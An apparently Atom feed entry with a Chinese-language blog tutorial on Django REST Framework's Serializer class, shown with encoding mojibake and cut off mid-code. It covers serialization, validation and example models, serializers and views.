      <title>Django REST Framework å­¦ä¹ ç¬”è®°ï¼ˆä¸ƒï¼‰ï¼šåºåˆ—åŒ–æ¨¡å— serialziers ä¹‹ Serialzierç±»</title>
      <link href="/tech/drf-learning-notes-7-the-serialzier-class-in-serialziers-module/"/>
      <url>/tech/drf-learning-notes-7-the-serialzier-class-in-serialziers-module/</url>
      
        <content type="html"><![CDATA[<ul><li>Title(EN): <em><strong>Django REST Framework Learning Notes (7): the Serialzier class in serialziers module</strong></em></li><li>Author: dog2</li></ul><hr><h1 id="åŸºæœ¬ä¿¡æ¯"><a href="#åŸºæœ¬ä¿¡æ¯" class="headerlink" title="åŸºæœ¬ä¿¡æ¯"></a>åŸºæœ¬ä¿¡æ¯</h1><ul><li>æºç ï¼š<a href="https://github.com/encode/django-rest-framework/blob/master/rest_framework/serializers.py" target="_blank" rel="noopener"><code>rest_framework.response</code></a></li><li>å®˜æ–¹æ–‡æ¡£<ul><li><span class="exturl" data-url="aHR0cHM6Ly93d3cuZGphbmdvLXJlc3QtZnJhbWV3b3JrLm9yZy9hcGktZ3VpZGUvc2VyaWFsaXplcnMv">API Guild - Serializers<i class="fa fa-external-link-alt"></i></span></li><li><span class="exturl" data-url="aHR0cHM6Ly93d3cuZGphbmdvLXJlc3QtZnJhbWV3b3JrLm9yZy9hcGktZ3VpZGUvZmllbGRzLw==">API Guild - Serializer fields<i class="fa fa-external-link-alt"></i></span></li><li><span class="exturl" data-url="aHR0cHM6Ly93d3cuZGphbmdvLXJlc3QtZnJhbWV3b3JrLm9yZy9hcGktZ3VpZGUvcmVsYXRpb25zLw==">API Guild - Serializer relations<i class="fa fa-external-link-alt"></i></span></li></ul></li><li><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL2RvZy0yL2hlbGxvX2RyZi90cmVlL21hc3Rlci9ubzdfZHJmX1NlcmlhbGl6ZXI=">æœ¬æ–‡demoä»£ç Github<i class="fa fa-external-link-alt"></i></span></li></ul><p>DRFå¸¸ç”¨åºåˆ—åŒ–ç±»ä¸»è¦æœ‰</p><ul><li><code>rest_framework.serialziers.Serializer</code></li><li><code>rest_framework.serialziers.ModelSerializer</code></li><li><code>rest_framework.serialziers.ListSerializer</code></li></ul><p>æœ¬ç¯‡ä»‹ç»<code>rest_framework.serialziers.Serializer</code></p><a id="more"></a><h1 id="æºç åˆ†æ"><a href="#æºç åˆ†æ" class="headerlink" title="æºç åˆ†æ"></a>æºç åˆ†æ</h1><p>æ ¹æ®åŸºç±»<code>rest_framework.serialziers.BaseSerializer</code>æ„é€ å‡½æ•°</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self, instance=None, data=empty, **kwargs)</span>:</span></span><br></pre></td></tr></table></figure><p>å®šä¹‰å¥½Serialzierç±»åï¼Œå°±å¯ä»¥åˆ›å»ºSerializerå¯¹è±¡äº†ã€‚Serializerçš„æ„é€ æ–¹æ³•ä¸º</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Serializer(instance=<span class="literal">None</span>,data=empty,**kwargs)</span><br></pre></td></tr></table></figure><ol><li>ç”¨äºåºåˆ—åŒ–æ—¶ï¼Œå°†æ¨¡å‹ç±»å¯¹è±¡ä¼ å…¥<code>instance</code>å‚æ•°</li><li>ç”¨äºååºåˆ—åŒ–æ—¶ï¼Œå°†è¦è¢«ååºåˆ—åŒ–çš„æ•°æ®ä¼ å…¥<code>data</code>å‚æ•°</li><li>é™¤äº†<code>instance</code>å’Œ<code>data</code>å‚æ•°å¤–ï¼Œåœ¨æ„é€ S<code>erializer</code>å¯¹è±¡æ—¶ï¼Œè¿˜å¯ä»¥é€šè¿‡<code>context</code>å‚æ•°é¢å¤–æ·»åŠ æ•°æ®ã€‚é€šè¿‡<code>context</code>å‚æ•°é™„åŠ çš„æ•°æ®ï¼Œå¯ä»¥é€šè¿‡<code>Serializer</code>å¯¹è±¡çš„<code>context</code>å±æ€§è·å–ã€‚ <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">serializer = AccountSerializer(account, context=&#123;<span class="string">'request'</span>:request&#125;)</span><br></pre></td></tr></table></figure></li></ol><h1 id="ç”¨æ³•"><a href="#ç”¨æ³•" class="headerlink" title="ç”¨æ³•"></a>ç”¨æ³•</h1><p>åºåˆ—åŒ–å™¨çš„ä½¿ç”¨åˆ†ä¸¤ä¸ªé˜¶æ®µï¼š</p><ol><li><p>åœ¨å®¢æˆ·ç«¯è¯·æ±‚æ—¶ï¼Œä½¿ç”¨åºåˆ—åŒ–å™¨å¯ä»¥å®Œæˆå¯¹æ•°æ®çš„ååºåˆ—åŒ–ï¼ˆå°±æ˜¯å‰æ®µå¾€åç«¯ä¼ é€’æ•°æ®ï¼Œååºåˆ—åŒ–ä¹‹åä¿å­˜æ•°æ®ï¼‰</p></li><li><p>åœ¨æœåŠ¡å™¨å“åº”æ—¶ï¼Œä½¿ç”¨åºåˆ—åŒ–å™¨å¯ä»¥å®Œæˆå¯¹æ•°æ®çš„åºåˆ—åŒ–ï¼ˆæœåŠ¡å™¨å–å‡ºæ•°æ®ï¼Œåºåˆ—åŒ–ä¹‹åå¾€å‰æ®µå‘é€å±•ç¤ºï¼‰</p></li></ol><h2 id="åºåˆ—åŒ–"><a href="#åºåˆ—åŒ–" class="headerlink" title="åºåˆ—åŒ–"></a>åºåˆ—åŒ–</h2><p>åºåˆ—åŒ–æ˜¯å°†æ•°æ®è¿”å›ç»™å‰å°ã€‚DRFçš„åºåˆ—åŒ–ä½¿ç”¨æµç¨‹å¦‚ä¸‹ï¼š</p><ol><li>æŸ¥è¯¢å‡ºä¸€ä¸ªç”¨æˆ·å¯¹è±¡</li></ol><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> models <span class="keyword">import</span> user</span><br><span class="line">user = User.object.get(id=<span class="number">2</span>)</span><br></pre></td></tr></table></figure><ol start="2"><li>æ„é€ åºåˆ—åŒ–å™¨å¯¹è±¡ </li></ol><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> user.serializers <span class="keyword">import</span> UserSerializer</span><br><span class="line">user_obj = Userserializer(user)  <span class="comment">#æ”¾å…¥æŸ¥è¯¢å‡ºçš„userå¯¹è±¡</span></span><br></pre></td></tr></table></figure><ol start="3"><li>è·å–åºåˆ—åŒ–å¯¹è±¡ï¼Œé€šè¿‡dataå±æ€§å¯ä»¥è·å–åºåˆ—åŒ–åçš„æ•°æ®</li></ol><p>ä¸Šé¢æŸ¥å‡ºæ¥çš„user_seræ˜¯ä¸€ä¸ªserializerå¯¹è±¡ï¼Œéœ€è¦å–å‡ºå…·ä½“çš„æ•°æ®ä¼ ç»™å‰ç«¯ï¼Œæ‰€æœ‰è¦ç”¨åˆ° user_ser.dataå–å‡ºå…·ä½“æ•°æ®</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">user_ser = Userserializer(user).data</span><br></pre></td></tr></table></figure><ol start="4"><li>å¦‚æœè¦è¢«åºåˆ—åŒ–çš„æ•°æ®æ˜¯åŒ…å«å¤šæ¡æ•°æ®çš„ï¼ˆä¹Ÿå¯ä»¥è¯´è¢«[ ]åµŒå¥—çš„ï¼Œ<code>queryset</code>ç±»å‹æ•°æ®ï¼Œä¸ç®¡æ˜¯å¤šæ¡è¿˜æ˜¯å•æ¡ï¼‰,éœ€è¦æ·»åŠ <code>many=True</code>å‚æ•°</li></ol><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">user = models.User.objects.all()</span><br><span class="line">user_ser =  Userserialzier(user,many=<span class="literal">True</span>)</span><br></pre></td></tr></table></figure><ol start="5"><li>è‡ªå®šä¹‰åºåˆ—åŒ–å±æ€§</li></ol><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">serializers.SerializerMethodField()</span><br></pre></td></tr></table></figure><h2 id="ååºåˆ—åŒ–ä½¿ç”¨æµç¨‹"><a href="#ååºåˆ—åŒ–ä½¿ç”¨æµç¨‹" class="headerlink" title="ååºåˆ—åŒ–ä½¿ç”¨æµç¨‹"></a>ååºåˆ—åŒ–ä½¿ç”¨æµç¨‹</h2><p>ååºåˆ—åŒ–æ˜¯å°†å‰å¤©ä¼ æ¥çš„æ•°æ®æ•°æ®å­˜å…¥æ•°æ®åº“ã€‚DRFçš„ååºåˆ—åŒ–ä½¿ç”¨æµç¨‹å¦‚ä¸‹ï¼š</p><h3 id="æ•°æ®éªŒè¯"><a href="#æ•°æ®éªŒè¯" class="headerlink" title="æ•°æ®éªŒè¯"></a>æ•°æ®éªŒè¯</h3><ol><li><p>ä½¿ç”¨åºåˆ—åŒ–å™¨è¿›è¡Œååºåˆ—åŒ–æ—¶ï¼Œéœ€è¦å¯¹æ•°æ®è¿›è¡ŒéªŒè¯åï¼Œæ‰èƒ½è·å–éªŒè¯æˆåŠŸçš„æ•°æ®æˆ–ä¿å­˜æˆæ¨¡å‹ç±»å¯¹è±¡ã€‚</p></li><li><p>åœ¨è·å–ååºåˆ—åŒ–çš„æ•°æ®å‰ï¼Œå¿…é¡»è°ƒç”¨<code>is_valid()</code>æ–¹æ³•è¿›è¡ŒéªŒè¯ï¼ŒéªŒè¯æˆåŠŸè¿”å›<code>True</code>ï¼Œå¦åˆ™è¿”å›<code>False</code>ã€‚</p></li><li><p>éªŒè¯å¤±è´¥ï¼Œå¯ä»¥é€šè¿‡åºåˆ—åŒ–å¯¹è±¡çš„<code>errors</code>å±æ€§è·å–é”™è¯¯ä¿¡æ¯ï¼Œè¿”å›å­—å…¸ï¼ŒåŒ…å«äº†å­—æ®µå’Œå­—æ®µçš„é”™è¯¯ã€‚</p></li><li><p>éªŒè¯é€šè¿‡ï¼Œå¯ä»¥é€šè¿‡åºåˆ—åŒ–å™¨å¯¹è±¡çš„<code>validated_data</code>å±æ€§è·å–æ•°æ®</p></li></ol><h3 id="ä¿å­˜æ•°æ®"><a href="#ä¿å­˜æ•°æ®" class="headerlink" title="ä¿å­˜æ•°æ®"></a>ä¿å­˜æ•°æ®</h3><p>åºåˆ—åŒ–ç±»ä¸­å¿…é¡»é‡å†™<code>create</code>æ–¹æ³•ç”¨äºæ–°å¢ï¼Œé‡å†™<code>update</code>æ–¹æ³•ç”¨äºä¿®æ”¹ã€‚è§†å›¾ä¸­ä½¿ç”¨<code>create</code>å’Œ<code>save</code>æ–¹æ³•ã€‚</p><p>ä»æºç å¯çŸ¥<code>save</code>æ–¹æ³•å†…éƒ¨è°ƒç”¨çš„æ˜¯åºåˆ—åŒ–ç±»ä¸­çš„<code>create</code>æ–¹æ³•ï¼Œæ‰€ä»¥æ–°å¢å¿…é¡»è¦åœ¨åºåˆ—åŒ–ç±»ä¸­é‡å†™<code>create</code>æ–¹æ³•ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="ç”¨æ³•ç¤ºä¾‹"><a href="#ç”¨æ³•ç¤ºä¾‹" class="headerlink" title="ç”¨æ³•ç¤ºä¾‹"></a>ç”¨æ³•ç¤ºä¾‹</h2><h3 id="åºåˆ—åŒ–-1"><a href="#åºåˆ—åŒ–-1" class="headerlink" title="åºåˆ—åŒ–"></a>åºåˆ—åŒ–</h3><h4 id="æ¨¡å‹å±‚-models-py"><a href="#æ¨¡å‹å±‚-models-py" class="headerlink" title="æ¨¡å‹å±‚ models.py"></a>æ¨¡å‹å±‚ <code>models.py</code></h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span><span class="params">(models.Model)</span>:</span></span><br><span class="line">    SEX_CHOICES = [</span><br><span class="line">        [<span class="number">0</span>,<span class="string">'ç”·'</span>],</span><br><span class="line">        [<span class="number">1</span>,<span class="string">'å¥³'</span>],</span><br><span class="line">    ]</span><br><span class="line"></span><br><span class="line">    name = models.CharField(max_length=<span class="number">64</span>)</span><br><span class="line">    pwd = models.CharField(max_length=<span class="number">32</span>)</span><br><span class="line">    phone = models.CharField(max_length=<span class="number">11</span>,null=<span class="literal">True</span>,default=<span class="literal">None</span>)</span><br><span class="line">    sex = models.IntegerField(choices=SEX_CHOICES,default=<span class="number">0</span>)</span><br><span class="line">    icon = models.ImageField(upload_to=<span class="string">'icon'</span>,default=<span class="string">'icon/default.jpg'</span>)</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Meta</span>:</span></span><br><span class="line">        db_table=<span class="string">'old_boy_user'</span></span><br><span class="line">        verbose_name=<span class="string">'ç”¨æˆ·'</span></span><br><span class="line">        verbose_name_plural=verbose_name</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__str__</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="keyword">return</span> <span class="string">'%s'</span> %self.name</span><br></pre></td></tr></table></figure><h4 id="é…ç½®å±‚-settings-py"><a href="#é…ç½®å±‚-settings-py" class="headerlink" title="é…ç½®å±‚ settings.py"></a>é…ç½®å±‚ <code>settings.py</code></h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># æ³¨å†Œrest_framework</span></span><br><span class="line">INSTALLED_APPS = [</span><br><span class="line">    <span class="comment"># ...</span></span><br><span class="line">    <span class="string">'rest_framework'</span>,</span><br><span class="line">]</span><br><span class="line"></span><br><span class="line"><span class="comment"># mediaèµ„æº</span></span><br><span class="line">MEDIA_URL = <span class="string">'/media/'</span>  <span class="comment"># åæœŸé«˜çº§åºåˆ—åŒ–ç±»ä¸è§†å›¾ç±»ï¼Œä¼šä½¿ç”¨è¯¥é…ç½®</span></span><br><span class="line">MEDIA_ROOT = os.path.join(BASE_DIR, <span class="string">'media'</span>)  <span class="comment"># mediaèµ„æºè·¯å¾„</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># å›½é™…åŒ–é…ç½®</span></span><br><span class="line">LANGUAGE_CODE = <span class="string">'zh-hans'</span></span><br><span class="line">TIME_ZONE = <span class="string">'Asia/Shanghai'</span></span><br><span class="line">USE_I18N = <span class="literal">True</span></span><br><span class="line">USE_L10N = <span class="literal">True</span></span><br><span class="line">USE_TZ = <span class="literal">False</span></span><br></pre></td></tr></table></figure><h4 id="åºåˆ—åŒ–å±‚-api-serializers-py"><a href="#åºåˆ—åŒ–å±‚-api-serializers-py" class="headerlink" title="åºåˆ—åŒ–å±‚ api/serializers.py"></a>åºåˆ—åŒ–å±‚ <code>api/serializers.py</code></h4><ol><li><code>api</code>åº”ç”¨ä¸‹åˆ›å»º<code>serializers.py</code>æ–‡ä»¶</li><li>è®¾ç½®éœ€è¦è¿”å›ç»™å‰å°æ•°æ®æ ·å¼ é‚£äº›<code>model</code>ç±»æœ‰å¯¹åº”çš„å­—æ®µï¼Œä¸éœ€è¦è¿”å›çš„å°±ä¸ç”¨è®¾ç½®äº†</li><li>è®¾ç½®æ–¹æ³•å­—æ®µï¼Œå­—æ®µåå¯ä»¥éšæ„ï¼Œå­—æ®µå€¼ç”± <code>get_å­—æ®µå</code> æä¾›ï¼Œæ¥å®Œæˆä¸€äº›éœ€è¦å¤„ç†åœ¨è¿”å›çš„æ•°æ®ï¼Œç±»ä¼¼äº<code>forms</code>ç»„ä»¶</li></ol><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> rest_framework <span class="keyword">import</span> serializers, exceptions</span><br><span class="line"><span class="keyword">from</span> django.conf <span class="keyword">import</span> settings</span><br><span class="line"><span class="keyword">from</span> . <span class="keyword">import</span> models</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">UserSerializer</span><span class="params">(serializers.Serializer)</span>:</span>   <span class="comment">#åˆ›å»ºä¸€ä¸ªåºåˆ—åŒ–ç±»</span></span><br><span class="line">    name = serializers.CharField()      </span><br><span class="line">    phone = serializers.CharField()</span><br><span class="line">    <span class="comment"># åºåˆ—åŒ–æä¾›ç»™å‰å°çš„å­—æ®µä¸ªæ•°ç”±åå°å†³å®šï¼Œå¯ä»¥å°‘æä¾›ï¼Œä½†æ˜¯æä¾›çš„æ•°æ®åº“å¯¹åº”çš„å­—æ®µï¼Œåå­—ä¸€å®šè¦ä¸æ•°æ®åº“å­—æ®µç›¸åŒ</span></span><br><span class="line">    <span class="comment"># sex = serializers.IntegerField()</span></span><br><span class="line">    <span class="comment"># icon = serializers.ImageField()</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># è‡ªå®šä¹‰åºåˆ—åŒ–å±æ€§</span></span><br><span class="line">    <span class="comment"># å±æ€§åéšæ„ï¼Œå€¼ç”±å›ºå®šçš„å‘½åè§„èŒƒæ–¹æ³•æä¾›:</span></span><br><span class="line">    <span class="comment">#       get_å±æ€§å(self, å‚ä¸åºåˆ—åŒ–çš„modelå¯¹è±¡)</span></span><br><span class="line">    <span class="comment">#       è¿”å›å€¼å°±æ˜¯è‡ªå®šä¹‰åºåˆ—åŒ–å±æ€§çš„å€¼</span></span><br><span class="line">    gender = serializers.SerializerMethodField()</span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">get_gender</span><span class="params">(self, obj)</span>:</span></span><br><span class="line">        <span class="comment"># choiceç±»å‹çš„è§£é‡Šå‹å€¼ get_å­—æ®µ_display() æ¥è®¿é—®</span></span><br><span class="line">        <span class="keyword">return</span> obj.get_sex_display()</span><br><span class="line"></span><br><span class="line">ã€€ã€€ <span class="comment">#è‡ªå®šä¹‰åºåˆ—åŒ–å±æ€§icon</span></span><br><span class="line">    icon = serializers.SerializerMethodField()</span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">get_icon</span><span class="params">(self, obj)</span>:</span></span><br><span class="line">        <span class="comment"># settings.MEDIA_URL: è‡ªå·±é…ç½®çš„ /media/ï¼Œç»™åé¢é«˜çº§åºåˆ—åŒ–ä¸è§†å›¾ç±»å‡†å¤‡çš„</span></span><br><span class="line">        <span class="comment"># obj.iconä¸èƒ½ç›´æ¥ä½œä¸ºæ•°æ®è¿”å›ï¼Œå› ä¸ºå†…å®¹è™½ç„¶æ˜¯å­—ç¬¦ä¸²ï¼Œä½†æ˜¯ç±»å‹æ˜¯ImageFieldFileç±»å‹</span></span><br><span class="line">        <span class="keyword">return</span> <span class="string">'%s%s%s'</span> % (<span class="string">r'http://127.0.0.1:8000'</span>, settings.MEDIA_URL, str(obj.icon))</span><br></pre></td></tr></table></figure><h4 id="è§†å›¾å±‚-views-py"><a href="#è§†å›¾å±‚-views-py" class="headerlink" title="è§†å›¾å±‚ views.py"></a>è§†å›¾å±‚ <code>views.py</code></h4><ol><li>ä»æ•°æ®åº“ä¸­å°†è¦åºåˆ—åŒ–ç»™å‰å°çš„<code>model</code>å¯¹è±¡ï¼Œæˆ–æ˜¯å¤šä¸ª<code>model</code>å¯¹è±¡æŸ¥è¯¢å‡ºæ¥</li></ol><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">user_obj = models.User.objects.get(pk=pk)</span><br></pre></td></tr></table></figure><p>æˆ–è€…</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">user_obj_list = models.User.objects.all()</span><br></pre></td></tr></table></figure><ol start="2"><li>åºåˆ—åŒ–: <code>å¯¹è±¡.data</code> å°±æ˜¯å¯ä»¥è¿”å›ç»™å‰å°çš„åºåˆ—åŒ–æ•°æ®</li></ol><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">return</span> Response(&#123;</span><br><span class="line">    <span class="string">'status'</span>: <span class="number">0</span>,</span><br><span class="line">    <span class="string">'msg'</span>: <span class="number">0</span>,</span><br><span class="line">    <span class="string">'results'</span>: user_ser.data</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><p>å®Œæ•´ä»£ç ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span><span class="params">(APIView)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">get</span><span class="params">(self, request, *args, **kwargs)</span>:</span></span><br><span class="line">        pk = kwargs.get(<span class="string">'pk'</span>)</span><br><span class="line">        <span class="keyword">if</span> pk:  <span class="comment">#å•æŸ¥</span></span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                <span class="comment"># ç”¨æˆ·å¯¹è±¡ä¸èƒ½ç›´æ¥ä½œä¸ºæ•°æ®è¿”å›ç»™å‰å°</span></span><br><span class="line">                user_obj = models.User.objects.get(pk=pk)</span><br><span class="line">                <span class="comment"># åºåˆ—åŒ–ä¸€ä¸‹ç”¨æˆ·å¯¹è±¡</span></span><br><span class="line">                user_ser = serializers.UserSerializer(user_obj)</span><br><span class="line">                <span class="keyword">return</span> Response(&#123;</span><br><span class="line">                    <span class="string">'status'</span>: <span class="number">0</span>,</span><br><span class="line">                    <span class="string">'msg'</span>: <span class="number">0</span>,</span><br><span class="line">                    <span class="string">'results'</span>: user_ser.data   <span class="comment">#å¦‚æœä½ åœ¨åºåˆ—åŒ–çš„æ—¶å€™æ²¡æœ‰.data,é‚£ä¹ˆåœ¨ä¼ ç»™å‰ç«¯çš„æ—¶å€™å¿…é¡»è¦.data</span></span><br><span class="line">                &#125;)</span><br><span class="line">            <span class="keyword">except</span>:</span><br><span class="line">                <span class="keyword">return</span> Response(&#123;</span><br><span class="line">                    <span class="string">'status'</span>: <span class="number">2</span>,</span><br><span class="line">                    <span class="string">'msg'</span>: <span class="string">'ç”¨æˆ·ä¸å­˜åœ¨'</span>,</span><br><span class="line">                &#125;)</span><br><span class="line">        <span class="keyword">else</span>:  <span class="comment">#ç¾¤æŸ¥</span></span><br><span class="line">            <span class="comment"># ç”¨æˆ·å¯¹è±¡åˆ—è¡¨(queryset)ä¸èƒ½ç›´æ¥ä½œä¸ºæ•°æ®è¿”å›ç»™å‰å°</span></span><br><span class="line">            user_obj_list = models.User.objects.all()</span><br><span class="line">            <span class="comment"># åºåˆ—åŒ–ä¸€ä¸‹ç”¨æˆ·å¯¹è±¡</span></span><br><span class="line">            user_ser_data = serializers.UserSerializer(user_obj_list, many=<span class="literal">True</span>).data</span><br><span class="line">            <span class="keyword">return</span> Response(&#123;</span><br><span class="line">                <span class="string">'status'</span>: <span class="number">0</span>,</span><br><span class="line">                <span class="string">'msg'</span>: <span class="number">0</span>,</span><br><span class="line">                <span class="string">'results'</span>: user_ser_data</span><br><span class="line">            &#125;)</span><br></pre></td></tr></table></figure><h3 id="ååºåˆ—åŒ–"><a href="#ååºåˆ—åŒ–" class="headerlink" title="ååºåˆ—åŒ–"></a>ååºåˆ—åŒ–</h3><h4 id="ååºåˆ—å±‚-api-serializers-py"><a href="#ååºåˆ—å±‚-api-serializers-py" class="headerlink" title="ååºåˆ—å±‚ api/serializers.py"></a>ååºåˆ—å±‚ <code>api/serializers.py</code></h4><ol><li>è®¾ç½®å¿…å¡«ä¸é€‰å¡«åºåˆ—åŒ–å­—æ®µï¼Œè®¾ç½®æ ¡éªŒè§„åˆ™</li><li>ä¸ºéœ€è¦é¢å¤–æ ¡éªŒçš„å­—æ®µæä¾›å±€éƒ¨é’©å­å‡½æ•°ï¼Œå¦‚æœè¯¥å­—æ®µä¸å…¥åº“ï¼Œä¸”ä¸å‚ä¸å…¨å±€é’©å­æ ¡éªŒï¼Œå¯ä»¥å°†å€¼å–å‡ºæ ¡éªŒ <code>pop</code></li><li>ä¸ºæœ‰è”åˆå…³ç³»çš„å­—æ®µä»¬æä¾›å…¨å±€é’©å­å‡½æ•°ï¼Œå¦‚æœæŸäº›å­—æ®µä¸å…¥åº“ï¼Œå¯ä»¥å°†å€¼å–å‡ºæ ¡éªŒ</li><li><strong>å¿…é¡»é‡å†™<code>create</code>æ–¹æ³•ï¼Œå®Œæˆæ ¡éªŒé€šè¿‡çš„æ•°æ®å…¥åº“å·¥ä½œï¼Œå¾—åˆ°æ–°å¢çš„å¯¹è±¡</strong></li></ol><p>å®Œæ•´ä»£ç ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">UserDeserializer</span><span class="params">(serializers.Serializer)</span>:</span></span><br><span class="line">    <span class="comment"># 1) å“ªäº›å­—æ®µå¿…é¡»ååºåˆ—åŒ–</span></span><br><span class="line">    <span class="comment"># 2) å­—æ®µéƒ½æœ‰å“ªäº›å®‰å…¨æ ¡éªŒ</span></span><br><span class="line">    <span class="comment"># 3) å“ªäº›å­—æ®µéœ€è¦é¢å¤–æä¾›æ ¡éªŒ  é’©å­å‡½æ•°</span></span><br><span class="line">    <span class="comment"># 4) å“ªäº›å­—æ®µé—´å­˜åœ¨è”åˆæ ¡éªŒ</span></span><br><span class="line">    <span class="comment"># æ³¨ï¼šååºåˆ—åŒ–å­—æ®µéƒ½æ˜¯ç”¨æ¥å…¥åº“çš„ï¼Œä¸ä¼šå‡ºç°è‡ªå®šä¹‰æ–¹æ³•å±æ€§ï¼Œä¼šå‡ºç°å¯ä»¥è®¾ç½®æ ¡éªŒè§„åˆ™çš„è‡ªå®šä¹‰å±æ€§,ä¸å…¥æ•°æ®åº“çš„</span></span><br><span class="line">    name = serializers.CharField(</span><br><span class="line">        max_length=<span class="number">64</span>,</span><br><span class="line">        min_length=<span class="number">3</span>,</span><br><span class="line">        error_messages=&#123;</span><br><span class="line">            <span class="string">'max_length'</span>: <span class="string">'å¤ªé•¿'</span>,</span><br><span class="line">            <span class="string">'min_length'</span>: <span class="string">'å¤ªçŸ­'</span></span><br><span class="line">        &#125;</span><br><span class="line">    )</span><br><span class="line">    pwd = serializers.CharField()</span><br><span class="line">    phone = serializers.CharField(required=<span class="literal">False</span>)</span><br><span class="line">    sex = serializers.IntegerField(required=<span class="literal">False</span>)</span><br><span class="line"></span><br><span class="line">    <span 